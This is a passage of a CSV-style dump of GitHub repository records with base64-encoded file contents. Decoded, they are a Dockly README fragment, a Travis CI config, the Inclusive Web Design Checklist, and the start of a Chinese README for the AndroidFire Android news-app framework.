CmBgYAoKVGhpcyBpcyBtb3N0IGxpa2VseSBiZWNhdXNlIHlvdSdyZSB1c2lu
ZyBhbiB1bnN1cHBvcnRlZCBOb2RlLmpzIHZlcnNpb24uCkRvY2tseSByZXF1
aXJlcyBOb2RlLmpzIHY3LjYgYW5kIGFib3ZlCgoKCgojIEF1dGhvcgpMaXJh
biBUYWwgPGxpcmFuLnRhbEBnbWFpbC5jb20+Cg==
",,"bGFuZ3VhZ2U6IG5vZGVfanMKYmVmb3JlX3NjcmlwdDoKICAtIG5wbSBpbnN0
YWxsIC1nIGdhdHNieS1jbGkKbm9kZV9qczoKICAtICI4IgogIC0gIjEwIgph
ZnRlcl9zdWNjZXNzOgogIC0geWFybiBydW4gc2VtYW50aWMtcmVsZWFzZQpk
ZXBsb3k6CiAgcHJvdmlkZXI6IHNjcmlwdAogIHNjcmlwdDogY2QgZG9jcy8g
JiYgeWFybiBpbnN0YWxsICYmIHlhcm4gcnVuIGRlcGxveQogIHNraXBfY2xl
YW51cDogdHJ1ZQogIG9uOgogICAgYnJhbmNoOiBtYXN0ZXIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'inclusive-design-checklist',110424613,b'Aims to be the biggest checklist of inclusive design considerations ever',b'JavaScript',5,2390,,2390,False,b'https://api.github.com/repos/Heydon/inclusive-design-checklist/forks',"IyBJbmNsdXNpdmUgV2ViIERlc2lnbiBDaGVja2xpc3QKCkFpbXMgdG8gYmUg
dGhlICoqYmlnZ2VzdCoqIGNoZWNrbGlzdCBvZiBpbmNsdXNpdmUgZGVzaWdu
IGNvbnNpZGVyYXRpb25zIGZvciB0aGUgd2ViIF9ldmVyXy4gSW5jbHVkZXMg
aXRlbXMgZm9yIGFjY2Vzc2liaWxpdHksIHBlcmZvcm1hbmNlLCBkZXZpY2Ug
c3VwcG9ydCwgaW50ZXJvcGVyYWJpbGl0eSwgYW5kIGxhbmd1YWdlLiBQdWxs
IHJlcXVlc3RzIHdlbGNvbWUhCgotIFsgXSBNaW5pZnkgQ1NTIGFuZCBKUywg
YW5kIHJlbW92ZSB1bnVzZWQvcmVkdW5kYW50IGNvZGUgW1sjMV0oaHR0cHM6
Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vc3BlZWQvZG9jcy9pbnNpZ2h0cy9N
aW5pZnlSZXNvdXJjZXMpXSAKLSBbIF0gTWFpbnRhaW4gdGVyc2UgSFRNTCwg
d2l0aG91dCBvdmVyLXJlbGlhbmNlIG9uIGA8ZGl2PmAgc2NhZmZvbGRpbmcg
W1sjMV0oaHR0cDovL2Rlc2lnbmluZ2ZvcnBlcmZvcm1hbmNlLmNvbS9vcHRp
bWl6aW5nLW1hcmt1cC1hbmQtc3R5bGVzLyNkaXZpdGlzKV0gCi0gWyBdIFVz
ZSBzY3JlZW4gcmVhZGVyIGFuZCBrZXlib2FyZCBhY2Nlc3NpYmxlIEhUTUwg
W1sjMV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9j
cy9MZWFybi9BY2Nlc3NpYmlsaXR5L0hUTUwpXSAKLSBbIF0gQ29tcHJlc3Mg
cmFzdGVyIGltYWdlcyBbWyMxXShodHRwczovL3d3dy5odG1sNXJvY2tzLmNv
bS9lbi90dXRvcmlhbHMvc3BlZWQvaW1nLWNvbXByZXNzaW9uLyldIAotIFsg
XSBPcHRpbWl6ZSBTVkcgcGF0aCBkYXRhIFtbIzFdKGh0dHBzOi8vd2ViLWRl
c2lnbi13ZWVrbHkuY29tLzIwMTQvMTAvMjIvb3B0aW1pemluZy1zdmctd2Vi
LyldIAotIFsgXSBNYWtlIHN1cmUgaGVhZGluZyBsZXZlbHMgZGVzY3JpYmUg
YSBsb2dpY2FsIHNlY3Rpb24vc3Vic2VjdGlvbiBzdHJ1Y3R1cmUgW1sjMV0o
aHR0cHM6Ly93ZWJhaW0ub3JnL3RlY2huaXF1ZXMvc2VtYW50aWNzdHJ1Y3R1
cmUvKV0gCi0gWyBdIE9ubHkgaW5jbHVkZSBoZWFkaW5nIGVsZW1lbnRzIHdo
ZXJlIHRoZXkgaW50cm9kdWNlIHNlY3Rpb25zIG9mIGNvbnRlbnQKLSBbIF0g
UmVtb3ZlIHBvdGVudGlhbGx5IGluc2Vuc2l0aXZlIG9yIHVuaW5jbHVzaXZl
IGxhbmd1YWdlICh1c2UgInNpbmd1bGFyIHRoZXkiKSBbWyMxXShodHRwOi8v
YWxleGpzLmNvbS8pXSAKLSBbIF0gR2l2ZSB2aWRlbyBjb250ZW50IGNhcHRp
b25zIGFuZCB0cmFuc2NyaXB0cwotIFsgXSBQcm92aWRlIHRyYW5zY3JpcHRz
IGZvciBhdWRpbyBjb250ZW50Ci0gWyBdIE1ha2Ugc3VyZSBtYWluIGJvZHkg
KHBhcmFncmFwaCkgdGV4dCBpcyBubyBzbWFsbGVyIHRoYW4gdGhlIGRlZmF1
bHQgKHVzZXIgYWdlbnQpIHNpemUgW1sjMV0oaHR0cHM6Ly93d3cuc21hc2hp
bmdtYWdhemluZS5jb20vMjAxMS8xMC8xNi1waXhlbHMtYm9keS1jb3B5LWFu
eXRoaW5nLWxlc3MtY29zdGx5LW1pc3Rha2UvKV0gCi0gWyBdIFN1cHBvcnQg
InBpbmNoIHpvb20iIChyZW1vdmUgYHVzZXItc2NhbGFibGU9bm9gIGlmIHBy
ZXNlbnQpCi0gWyBdIFVzZSByZWxhdGl2ZSB1bml0cyAoYGVtYCwgYHJlbWAs
IGFuZCBgY2hgKSwgZXNwZWNpYWxseSBmb3IgZm9udCBtZXRyaWNzCi0gWyBd
IE1ha2Ugc3VyZSBzdHlsZXMgYW5kIHNjcmlwdHMgYXJlIG5vdCByZW5kZXIg
YmxvY2tpbmcgW1sjMV0oaHR0cHM6Ly9jc2FiYXBhbGZpLmdpdGh1Yi5pby9l
bGltaW5hdGUtcmVuZGVyLWJsb2NraW5nLyldIAotIFsgXSBJbnN0YWxsIGEg
c2VydmljZSB3b3JrZXIgYW5kIGNhY2hlIGFsbCBhcHBsaWNhYmxlIGFzc2V0
cyBbWyMxXShodHRwczovL2Nzcy10cmlja3MuY29tL3NlcnZpY2V3b3JrZXIt
Zm9yLW9mZmxpbmUvKV0gCi0gWyBdIFVzZSBjb250ZW50LWJhc2VkLCBub3Qg
ZGV2aWNlLXNwZWNpZmljLCBtZWRpYSBxdWVyaWVzIFtbIzFdKGh0dHA6Ly9i
cmFkZnJvc3QuY29tL2Jsb2cvcG9zdC83LWhhYml0cy1vZi1oaWdobHktZWZm
ZWN0aXZlLW1lZGlhLXF1ZXJpZXMvI2NvbnRlbnQpXSAKLSBbIF0gUHJvdmlk
ZSBhbHRlcm5hdGl2ZXMgYW5kL29yIGRlc2NyaXB0aW9ucyBmb3IgY29tcGxl
eCB2aXN1YWxpemF0aW9ucwotIFsgXSBJbmNsdWRlIG9ubHkgY2xlYXIsIG1l
YW5pbmdmdWwgYW5pbWF0aW9ucwotIFsgXSBIb25vciByZXF1ZXN0cyB0byBy
ZW1vdmUgYW5pbWF0aW9uIHZpYSB0aGUgYHByZWZlcnMtcmVkdWNlZC1tb3Rp
b25gIG1lZGlhIHF1ZXJ5Ci0gWyBdIE1ha2Ugc3VyZSBjb250cm9scyBkbyBu
b3QgZWxpY2l0IHVuZXhwZWN0ZWQgb3IgamFycmluZyBiZWhhdmlvciBbWyMx
XShodHRwczovL3d3dy53My5vcmcvVFIvVU5ERVJTVEFORElORy1XQ0FHMjAv
Y29uc2lzdGVudC1iZWhhdmlvci1yZWNlaXZlLWZvY3VzLmh0bWwpXSAgW1sj
Ml0oaHR0cHM6Ly93d3cudzMub3JnL1RSL1VOREVSU1RBTkRJTkctV0NBRzIw
L2NvbnNpc3RlbnQtYmVoYXZpb3ItdW5wcmVkaWN0YWJsZS1jaGFuZ2UuaHRt
bCldIAotIFsgXSBEbyBub3QgaW5jbHVkZSB0aGlyZCBwYXJ0aWVzIHRoYXQg
Y29tcHJvbWlzZSB1c2VyIHByaXZhY3kgW1sjMV0oaHR0cHM6Ly9jc3MtdHJp
Y2tzLmNvbS9wb3RlbnRpYWwtZGFuZ2Vycy1vZi10aGlyZC1wYXJ0eS1qYXZh
c2NyaXB0LyldIAotIFsgXSBEbyBub3QgcmVjcmVhdGUgc3VwcG9ydGVkIGFu
ZCBleHBlY3RlZCBicm93c2VyIGJlaGF2aW9ycyB3aXRoIGJlc3Bva2Ugc2Ny
aXB0cwotIFsgXSBTdXBwb3J0IFdpbmRvd3MgaGlnaCBjb250cmFzdCBtb2Rl
ICh1c2UgaW1hZ2VzLCBub3QgYmFja2dyb3VuZCBpbWFnZXMpIFtbIzFdKGh0
dHA6Ly9hZHJpYW5yb3NlbGxpLmNvbS8yMDEyLzA4L2Nzcy1iYWNrZ3JvdW5k
LWltYWdlcy1oaWdoLWNvbnRyYXN0LW1vZGUuaHRtbCldIAotIFsgXSBQcm92
aWRlIGFsdGVybmF0aXZlIHRleHQgZm9yIHNhbGllbnQgaW1hZ2VzIFtbIzFd
KGh0dHBzOi8vd3d3LnczLm9yZy9XQUkvdHV0b3JpYWxzL2ltYWdlcy9kZWNp
c2lvbi10cmVlLyldIAotIFsgXSBBcHBseSBgYWx0PSJgIG9yIGBhcmlhLWhp
ZGRlbj0idHJ1ZSJgIHRvIGRlY29yYXRpdmUgaW1hZ2VzIFtbIzFdKGh0dHBz
Oi8vd3d3LnczLm9yZy9XQUkvdHV0b3JpYWxzL2ltYWdlcy9kZWNvcmF0aXZl
LyldIAotIFsgXSBNYWtlIHN1cmUgdGV4dCBhbmQgYmFja2dyb3VuZCBjb2xv
cnMgY29udHJhc3Qgc3VmZmljaWVudGx5IFtbIzFdKGh0dHBzOi8vYWNjZXNz
aWJpbGl0eS5ibG9nLmdvdi51ay8yMDE2LzA2LzE3L2NvbG91ci1jb250cmFz
dC13aHktZG9lcy1pdC1tYXR0ZXIvKV0gCi0gWyBdIFByb3ZpZGUgYDx0aXRs
ZT5gcyB0aGF0IG5hbWUgdGhlIHNpdGUgYW5kIHRoZSBzcGVjaWZpYyBwYWdl
IFtbIzFdKGh0dHBzOi8vd3d3LnczLm9yZy9UUi9XQ0FHMjAtVEVDSFMvRzg4
Lmh0bWwpXSAKLSBbIF0gUHJvdmlkZSBsYXJnZSB0b3VjaCAidGFyZ2V0cyIg
Zm9yIGludGVyYWN0aXZlIGVsZW1lbnRzIFtbIzFdKGh0dHA6Ly93d3cuYmJj
LmNvLnVrL2d1aWRlbGluZXMvZnV0dXJlbWVkaWEvYWNjZXNzaWJpbGl0eS9t
b2JpbGUvZGVzaWduL3RvdWNoLXRhcmdldC1zaXplKV0gCi0gWyBdIFVzZSBk
YXRhIHRhYmxlcyAoYDx0YWJsZT5gKSBmb3IgZGF0YSBvbmx5LCBub3Qgdmlz
dWFsIGxheW91dCBwdXJwb3NlcwotIFsgXSBNYWtlIHNjcm9sbGFibGUgZWxl
bWVudHMgZm9jdXNhYmxlIGZvciBrZXlib2FyZCB1c2VycwotIFsgXSBEbyBu
b3QgcmVseSBvbiBjb2xvciBmb3IgZGlmZmVyZW50aWF0aW9uIG9mIHZpc3Vh
bCBlbGVtZW50cwotIFsgXSBVc2UgdGhlIHNhbWUgZGVzaWduIHBhdHRlcm5z
IHRvIHNvbHZlIHRoZSBzYW1lIHByb2JsZW1zCi0gWyBdIEVuc3VyZSBrZXli
b2FyZCBmb2N1cyBvcmRlciBpcyBsb2dpY2FsIHJlZ2FyZGluZyB2aXN1YWwg
bGF5b3V0Ci0gWyBdIExhenkgbG9hZCBsYXJnZSBpbWFnZSBhc3NldHMKLSBb
IF0gSG9ub3VyIEROVCAoRG8gTm90IFRyYWNrKSBoZWFkZXIgW1sjMV0oaHR0
cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSFRU
UC9IZWFkZXJzL0ROVCldIAotIFsgXSBUcmFuc2xhdGUgLyBzcGVsbCBvdXQg
YWNyb255bXMgdGhlIGZpcnN0IHRpbWUgeW91IHVzZSB0aGVtCi0gWyBdIERv
IG5vdCBoaWphY2sgc3RhbmRhcmQgc2Nyb2xsaW5nIGJlaGF2aW9yCi0gWyBd
IE1vdmUgZm9jdXMgYmV0d2VlbiBkaWFsb2dzIGFuZCB0aGUgY29udHJvbHMg
dGhhdCBpbnZva2VkIHRoZW0KLSBbIF0gR2l2ZSBhbGwgZm9ybSBlbGVtZW50
cyBwZXJtYW5lbnRseSB2aXNpYmxlIGxhYmVscwotIFsgXSBHaXZlIGdyb3Vw
ZWQgZm9ybSBlbGVtZW50cyBncm91cCBsYWJlbHMKLSBbIF0gUGxhY2UgbGFi
ZWxzIGFib3ZlIGZvcm0gZWxlbWVudHMKLSBbIF0gUHJvdmlkZSBzdGF0dXMg
YW5kIGVycm9yIG1lc3NhZ2VzIGFzIFdBSS1BUklBIGxpdmUgcmVnaW9ucwot
IFsgXSBQcm92aWRlIGNsZWFyLCB1bmFtYmlndW91cyBmb2N1cyBzdHlsZXMK
LSBbIF0gRW1wbG95IHdlbGwtYmFsYW5jZWQsIGhpZ2hseSBsZWdpYmxlIGZv
bnRzIChub3QgdG9vIGNvbXBsZXggb3IgZWxhYm9yYXRlKQotIFsgXSBEbyBu
b3QgdXNlIHZlcnkgdGhpbiBmb250IGZhY2VzIFtbIzFdKGh0dHA6Ly93d3cu
dGVsZWdyYXBoLmNvLnVrL3NjaWVuY2UvMjAxNi8xMC8yMy9pbnRlcm5ldC1p
cy1iZWNvbWluZy11bnJlYWRhYmxlLWJlY2F1c2Utb2YtYS10cmVuZC10b3dh
cmRzLWxpZ2h0LyldIAotIFsgXSBFbnN1cmUgc3RhdGVzIChwcmVzc2VkLCBl
eHBhbmRlZCwgaW52YWxpZCwgZXRjKSBhcmUgY29tbXVuaWNhdGVkIHRvIGFz
c2lzdGl2ZSBzb2Z0d2FyZQotIFsgXSBNYXRjaCBzZW1hbnRpY3MgdG8gYmVo
YXZpb3IgZm9yIGFzc2lzdGl2ZSB0ZWNobm9sb2d5IHVzZXJzCi0gWyBdIFBy
b3ZpZGUgYSBkZWZhdWx0IGxhbmd1YWdlIGFuZCB1c2UgYGxhbmc9IltJU08g
Y29kZV0iYCBmb3Igc3Vic2VjdGlvbnMgaW4gZGlmZmVyZW50IGxhbmd1YWdl
cwotIFsgXSBNYWtlIGNvbnRyb2xzIGxvb2sgbGlrZSBjb250cm9sczsgZ2l2
ZSB0aGVtIHN0cm9uZyBwZXJjZWl2ZWQgYWZmb3JkYW5jZQotIFsgXSBVbmRl
cmxpbmUgbGlua3Mg4oCUIGF0IGxlYXN0IGluIGJvZHkgY29weQotIFsgXSBN
YWtlIHN1cmUgYWxsIGNvbnRlbnQgYmVsb25ncyB0byBhIGxhbmRtYXJrIGVs
ZW1lbnQgKGA8aGVhZGVyPmAsIGA8Zm9vdGVyPmAsIGA8bmF2PmAsIGA8bWFp
bj5gLCBldGMpCi0gWyBdIEF2b2lkIHB1cmUgd2hpdGUgb3IgcHVyZSBibGFj
ayBzaGFkZXMKLSBbIF0gTWFyayBpbnZhbGlkIGZpZWxkcyBjbGVhcmx5IGFu
ZCBwcm92aWRlIGFzc29jaWF0ZWQgZXJyb3IgbWVzc2FnZXMKLSBbIF0gRW5z
dXJlIGNvbnRlbnQgaXMgbm90IG9ic2N1cmVkIHRocm91Z2ggem9vbWluZyAo
bm8gZml4ZWQgd2lkdGhzKQotIFsgXSBQcm92aWRlIGEgYG1hbmlmZXN0Lmpz
b25gIGZpbGUgZm9yIGlkZW50aWZpYWJsZSBob21lc2NyZWVuIGVudHJpZXMK
LSBbIF0gSW5kaWNhdGUgc3dpcGUgZ2VzdHVyZSBzdXBwb3J0IGNsZWFybHks
IGFuZCBwcm92aWRlIHNpbXBsZSB0YXAtYmFzZWQgYWx0ZXJuYXRpdmVzCi0g
WyBdIE1ha2Ugc3VyZSBkYXRhIHRhYmxlcyB3aWRlciB0aGFuIHRoZWlyIGNv
bnRhaW5lciBjYW4gYmUgc2Nyb2xsZWQgaG9yaXpvbnRhbGx5Ci0gWyBdIEF2
b2lkIHRpbWUgY29uc3RyYWludHMgd2hlcmUgcG9zc2libGU7IHByb3ZpZGUg
YSBjbGVhciB3YXJuaW5nIGFuZCBvcHRpb24gdG8gZXh0ZW5kIHdoZXJlIG5v
dCBwb3NzaWJsZSAKLSBbIF0gTGFiZWwgYW5kIGRlc2NyaWJlIHRoZSBzYW1l
IHRoaW5ncyB3aXRoIHRoZSBzYW1lIHRlcm1pbm9sb2d5Ci0gWyBdIEVuc3Vy
ZSBkaXNhYmxlZCBjb250cm9scyBhcmUgbm90IGZvY3VzYWJsZQotIFsgXSBE
byBub3QgaW5zdGF0ZSAiaW5maW5pdGUgc2Nyb2xsIiBieSBkZWZhdWx0OyBw
cm92aWRlIGJ1dHRvbnMgdG8gbG9hZCBtb3JlIGl0ZW1zCi0gWyBdIEF2b2lk
IGp1c3RpZmllZCBib2R5IHRleHQgW1sjMV0oaHR0cHM6Ly93d3cudzMub3Jn
L1RSL1dDQUcyMC1URUNIUy9GODguaHRtbCldIAotIFsgXSBQcm92aWRlIGVu
b3VnaCBzcGFjaW5nIGJldHdlZW4gbGluZXMgb2YgdGV4dCAoYGxpbmUtaGVp
Z2h0YCkgW1sjMV0oaHR0cHM6Ly93d3cudzMub3JnL1RSL1dDQUcyMC1URUNI
Uy9DMjEuaHRtbCldIAotIFsgXSBFbnN1cmUgUERGIGNvbnRlbnQgaXMgYWNj
ZXNzaWJsZSAoaW5jbHVkZSB0YWdzKSBbWyMxXShodHRwczovL3dlYmFpbS5v
cmcvdGVjaG5pcXVlcy9hY3JvYmF0LyldIAotIFsgXSBQcm92aWRlIGEgc2tp
cCBsaW5rIGlmIG5lY2Vzc2FyeSAgW1sjMV0oaHR0cHM6Ly93ZWJhaW0ub3Jn
L3RlY2huaXF1ZXMvc2tpcG5hdi8pXSAKLSBbIF0gQXZvaWQgYWxsLWNhcHMg
dGV4dCBbWyMxXShodHRwczovL2dpdGh1Yi5jb20vaHVtYW5tYWRlL2htLXBh
dHRlcm4tbGlicmFyeS9pc3N1ZXMvNzUpXSAKLSBbIF0gRW5zdXJlIHRoYXQg
Y29udGVudCBpcyB3cml0dGVuIGFzIGNsZWFybHkgYW5kIHNpbXBseSBhcyBw
b3NzaWJsZSBbWyMxXShodHRwczovL3d3dy53My5vcmcvVFIvVU5ERVJTVEFO
RElORy1XQ0FHMjAvbWVhbmluZy1zdXBwbGVtZW50cy5odG1sKV0gCi0gWyBd
IFByb3ZpZGUgZGVzY3JpcHRpdmUgY2FwdGlvbnMgZm9yIGZpZ3VyZXMKLSBb
IF0gV2FybiB1c2VycyBvZiBsaW5rcyB0aGF0IGhhdmUgdW51c3VhbCBiZWhh
dmlvcnMsIGxpa2UgbGlua2luZyBvZmYtc2l0ZSwgb3IgbG9hZGluZyBhIG5l
dyB0YWIKLSBbIF0gTWFrZSBjb250ZW50IGVhc2llciB0byBmaW5kIGFuZCBp
bXByb3ZlIHNlYXJjaCByZXN1bHRzIHdpdGggc3RydWN0dXJlZCBkYXRhIFtb
IzFdKGh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGUuY29tL3NlYXJjaC9kb2Nz
L2d1aWRlcy9wcm90b3R5cGUpXSAKLSBbIF0gVXNlIHRleHR1YWwgbGFiZWxz
IHRvIG1ha2Ugdm9pY2UgYWN0aXZhdGlvbiBjdWVzIG9idmlvdXMKLSBbIF0g
RG8gbm90IG1hcmsgdXAgc3ViaGVhZGluZ3Mvc3RyYXBsaW5lcyB3aXRoIHNl
cGFyYXRlIGhlYWRpbmcgZWxlbWVudHMKLSBbIF0gRW5zdXJlIHByaW1hcnkg
Y2FsbHMgdG8gYWN0aW9uIGFyZSBlYXN5IHRvIHJlY29nbml6ZSBhbmQgcmVh
Y2gKLSBbIF0gQXZvaWQgaW1hZ2VzIG9mIHRleHQg4oCUIHRleHQgdGhhdCBj
YW5ub3QgYmUgdHJhbnNsYXRlZCwgc2VsZWN0ZWQsIG9yIHVuZGVyc3Rvb2Qg
YnkgYXNzaXN0aXZlIHRlY2gKLSBbIF0gUHJvdmlkZSBhIHByaW50IHN0eWxl
c2hlZXQgKHNpbmdsZSBjb2x1bW4sIHdpdGggaW50ZXJhY3RpdmUgY29udGVu
dCBoaWRkZW4pCi0gWyBdIFVzZSB3ZWxsLWVzdGFibGlzaGVkLCB0aGVyZWZv
cmUgcmVjb2duaXphYmxlLCBpY29ucyBhbmQgc3ltYm9scwotIFsgXSBTdWJz
ZXQgZm9udHMgdG8ganVzdCB0aGUgY2hhcmFjdGVycyBuZWVkZWQKLSBbIF0g
SW5zdGVhZCBvZiBvYnN0cnVjdGluZyB1c2VycyB3aXRoIENBUFRDSEFzLCB1
c2UgaG9uZXlwb3RzIFtbIzFdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93
aWtpL0hvbmV5cG90Xyhjb21wdXRpbmcpKV0gCi0gWyBdIEJlZ2luIGxvbmcs
IG11bHRpLXNlY3Rpb24gZG9jdW1lbnRzIHdpdGggYSB0YWJsZSBvZiBjb250
ZW50cwotIFsgXSBEb24idCBtYWtlIHVzZXJzIHBlcmZvcm0gYWN0aW9ucyB0
byByZXZlYWwgY29udGVudCB1bmxlc3MgY29tcGxldGVseSBuZWNlc3NhcnkK
LSBbIF0gSWYgY29udGVudCBpcyBtZWFudCB0byBiZSBoaWRkZW4sIGVuc3Vy
ZSBpdCBpcyBwcm9wZXJseSBoaWRkZW4gdG8gYWxsIHVzZXJzCi0gWyBdIE1h
a2Ugc3VyZSBjb250cm9scyB3aXRoaW4gaGlkZGVuIGNvbnRlbnQgYXJlIG5v
dCBmb2N1c2FibGUKLSBbIF0gVXNlIGBzcmNzZXRgIHRvIHRhaWxvciBpbWFn
ZXMgdG8gZGV2aWNlcyBhbmQgcmVkdWNlIGJhbmR3aWR0aCBjb3N0cwotIFsg
XSBEbyBub3QgYXV0byBmb2N1cyBmb3JtIGZpZWxkcywgb24gcGFnZSBsb2Fk
Ci0gWyBdIEJyZWFrIHVwIGxvbmcgYW5kIGNvbXBsZXggZm9ybXMgaW50byBk
aXNjcmV0ZSBzZWN0aW9ucyBhbmQvb3Igc2NyZWVucwotIFsgXSBNYWtlIGZv
cm1zIGFzIHNob3J0IGFzIHBvc3NpYmxlOyBvZmZlciBzaG9ydGN1dHMgbGlr
ZSBhdXRvY29tcGxldGluZyB0aGUgYWRkcmVzcyB1c2luZyB0aGUgcG9zdGNv
ZGUKLSBbIF0gRW5zdXJlIHRoZSBzYW1lIGNvbnRlbnQgaXMgYXZhaWxhYmxl
IGFjcm9zcyBkaWZmZXJlbnQgZGV2aWNlcyBhbmQgcGxhdGZvcm1zCi0gWyBd
IEluZm9ybSB0aGUgdXNlciB3aGVuIHRoZXJlIGFyZSBpbXBvcnRhbnQgY2hh
bmdlcyB0byB0aGUgYXBwbGljYXRpb24gc3RhdGUKLSBbIF0gTWFrZSBzdXJl
IHRoZSBwdXJwb3NlIG9mIGEgbGluayBpcyBjbGVhcmx5IGRlc2NyaWJlZDog
InJlYWQgbW9yZSIgdnMuICJyZWFkIG1vcmUgYWJvdXQgYWNjZXNzaWJpbGl0
eSIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'AndroidFire',69235642,b'AndroidFire\xef\xbc\x8c\xe4\xb8\x80\xe6\xac\xbe\xe6\x96\xb0\xe9\x97\xbb\xe9\x98\x85\xe8\xaf\xbb App\xe6\xa1\x86\xe6\x9e\xb6\xef\xbc\x8c\xe5\x9f\xba\xe4\xba\x8e Material Design + MVP + RxJava + Retrofit + Glide\xef\xbc\x8c\xe5\x9f\xba\xe6\x9c\xac\xe6\xb6\xb5\xe7\x9b\x96\xe4\xba\x86\xe5\xbd\x93\xe5\x89\x8d Android \xe7\xab\xaf\xe5\xbc\x80\xe5\x8f\x91\xe6\x9c\x80\xe5\xb8\xb8\xe7\x94\xa8\xe7\x9a\x84\xe4\xb8\xbb\xe6\xb5\x81\xe6\xa1\x86\xe6\x9e\xb6\xef\xbc\x8c\xe5\x9f\xba\xe4\xba\x8e\xe6\xad\xa4\xe6\xa1\x86\xe6\x9e\xb6\xe5\x8f\xaf\xe4\xbb\xa5\xe5\xbf\xab\xe9\x80\x9f\xe5\xbc\x80\xe5\x8f\x91\xe4\xb8\x80\xe4\xb8\xaaapp\xe3\x80\x82',b'Java',34,2390,,2390,False,b'https://api.github.com/repos/jaydenxiao2016/AndroidFire/forks',"QW5kcm9pZEZpcmXvvIzkuIDmrL7mlrDpl7vpmIXor7sgQXBw5qGG5p6277yM
5Z+65LqOIE1hdGVyaWFsIERlc2lnbiArIE1WUCArIFJ4SmF2YSArIFJldHJv
Zml0ICsgR2xpZGXvvIzln7rmnKzmtrXnm5bkuoblvZPliY0gQW5kcm9pZCDn
q6/lvIDlj5HmnIDluLjnlKjnmoTkuLvmtYHmoYbmnrbvvIzln7rkuo7mraTm
oYbmnrblj6/ku6Xlv6vpgJ/lvIDlj5HkuIDkuKphcHDjgIIKClvlronoo4Xl
nLDlnYBdKGh0dHA6Ly9maXIuaW0vYW5kcm9pZEZpcmUpCiMjIyMg5Zu96ZmF
5qGI5L6L77yM5pyJ5Zu+5pyJ55yf55u477yaCgohW+mmlumhteaViOaenOWb
vl0oaHR0cHM6Ly9tbWJpei5xbG9nby5jbi9tbWJpel9qcGcvMkVoakNjY2VP
bWlhY1ZzSTR3RTZjRHBPWUhjMGdya2liemlicG94QUc4RXdCTFZuNGRIaWIz
RDBXd3JlejRXZU5tRmtpYjE5dktpYlluTXU5blF1Y3FQNWd2dncvMD93eF9m
bXQ9anBlZykKIVvnvo7lpbPlkozop4bpopHmlYjmnpzlm75dKGh0dHBzOi8v
bW1iaXoucWxvZ28uY24vbW1iaXpfanBnLzJFaGpDY2NlT21pYWNWc0k0d0U2
Y0RwT1lIYzBncmtpYnpxYW8xaWEyNlJpYVprUDkxdEtlUEdUNE9rdVdVODd3
dFlkbXhwVGF1aWFsSWhoa1ZOaWM1RFRVYmlhZy8wP3d4X2ZtdD1qcGVnKQoh
W+WFs+azqOWSjOaci+WPi+WciOaViOaenOWbvl0oaHR0cHM6Ly9tbWJpei5x
bG9nby5jbi9tbWJpel9qcGcvMkVoakNjY2VPbWlhY1ZzSTR3RTZjRHBPWUhj
MGdya2lienhiWkJwY3d6ZlQ0aWNuNjEzbHRwdmNwVlExdW0yUnJkT0tPekEy
WE84RVRURTVES1RudEtTQlEvMD93eF9mbXQ9anBlZykKIVvmnIvlj4vlnIjp
gInmi6nlm77niYflj5HluINdKGh0dHBzOi8vbW1iaXoucWxvZ28uY24vbW1i
aXpfanBnLzJFaGpDY2NlT21pYWNWc0k0d0U2Y0RwT1lIYzBncmtpYnpBSUxB
bzVua1FobnNIa0wzR3lqYmdFaWI4Q0Z5a0FqWEtuOVNLd3NEN1BTemZRREJo
T0lzVkZBLzA/d3hfZm10PWpwZWcpCgojIyMjIOebruWJjeaooeWdl+WMheaL
rO+8mgotIOaWsOmXu++8muWktOadoeOAgeenkeaKgOOAgei0oue7j+OAgU5C
Qeetieexu+Wei++8jOWPr+iHquS4u+mAieaLqeiuoumYhQotIOe+juWbvu+8
mue+juWbvuWjgee6uAotIOinhumike+8muWMheaLrOeDreeCueOAgeaQnues
keOAgeWoseS5kOOAgeeyvuWTgeinhumikQotIOWFs+azqO+8muWMheaLrOac
i+WPi+WciOOAgeaXpeWknOaooeW8j+WIh+aNoijml6DpnIDph43lkK/nlYzp
naIp5Yqf6IO9CgojIyMjIOmhueebruS6rueCue+8mgotIG12cOaooeW8j++8
muino+iApm1vZGVs5ZKMdmlld+Wxgu+8jOWlkee6puexu+euoeeQhm12cO+8
jOS4gOebruS6hueEtu+8jOWunueOsOe6teWQkeino+iApu+8jOWfuuexu+Wu
jOe+juWwgeijhe+8jOmBv+WFjemikee5gW5ld+WvueixoQotICBSeEphdmE6
5YyF5ousUnjlpITnkIbmnI3liqHlmajor7fmsYLjgIHnvJPlrZjjgIHnur/n
qIvosIPluqbnmoTlroznvo7lsIHoo4UKLSDlpI3mnYLliJfooajlpITnkIbv
vIzlhYXliIbop6PlhrPmu5HliqjljaHpob/pl67popjvvIzlhbfkvZPmlrnm
s5XnnIvlhbPms6jmqKHlnZfph4zpnaLnmoTigJzmnIvlj4vlnIjigJ3kvovl
rZAKLSDnu4Tku7bljJblvIDlj5HvvIzmqKrlkJHop6PogKYKLSDlsIHoo4Xl
kITnp43lt6XlhbfnsbvvvIzmr5TlpoLljovnvKnlm77niYfjgIHova7mkq3l
majjgIHmn6XnnIvlpKflm77jgIHnvJPlrZjlt6XlhbfjgIHlm77niYfpgInm
i6nlmajvvIzku6Vjb21tb27nmoRtb2R1bGXlvaLlvI/kvp3otZYKLSDlkITn
p43lsIHoo4Xlpb3nmoTkvp3otZblupPvvIzmr5TlpoJJcmVjeWNsZXJ2aWV3
